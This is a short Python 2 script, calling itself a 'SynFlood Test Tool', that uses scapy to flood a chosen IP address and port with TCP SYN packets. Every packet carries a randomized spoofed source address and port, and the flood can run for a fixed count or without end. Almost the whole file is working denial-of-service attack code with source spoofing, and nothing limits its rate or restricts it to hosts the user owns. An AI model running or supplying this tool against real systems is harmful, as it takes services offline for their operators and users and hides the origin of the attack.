#!/usr/bin/env python

import sys
import argparse
import os
from scapy.all import *

if os.getuid() !=0: #Check if the user running the program is root
	print "Need root privileges!"
	sys.exit(1)

parser = argparse.ArgumentParser(description="SynFlood Test Tool")
parser.add_argument('-c', action="store", dest='count', help='The amount of TCP SYN packet being sent in the attack (0 for unlimited)')
parser.add_argument('-d', action="store", dest='destination', help='The IP address of the target machine')
parser.add_argument('-p', action="store", dest='port', help='Destination port for the TCP SYN packets')
args = parser.parse_args()

if len(sys.argv) < 2: #Display help text
	parser.print_help()
	sys.exit(1)

args = vars(args) #Converting to dictionary format

print "Arguments:"
print "Destination: ", args['destination']
print "Dest. Port : ", args['port']
print "Count      : ", args['count']

#NETWORK STUF
ip = IP()
ip.dst = args['destination']
#Crating random ip address
ip.src = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

tcp = TCP()
tcp.dport = int(args['port'])
tcp.flags = "S"

stop = int(args['count'])

if stop > 0: #Count > 0: Fixed amount of iterations
	for x in range(0, stop):
		tcp.sport = RandShort() #Random Source Port number to avoid retransmissions
		ip.src = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
		send(ip/tcp)
else: #Count = 0: Unlimited iterations
	while True:
		tcp.sport = RandShort() #Random Source Port number to avoid retransmissions
		ip.src = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
		send(ip/tcp)
		
print "All packets has been sent, ", stop 
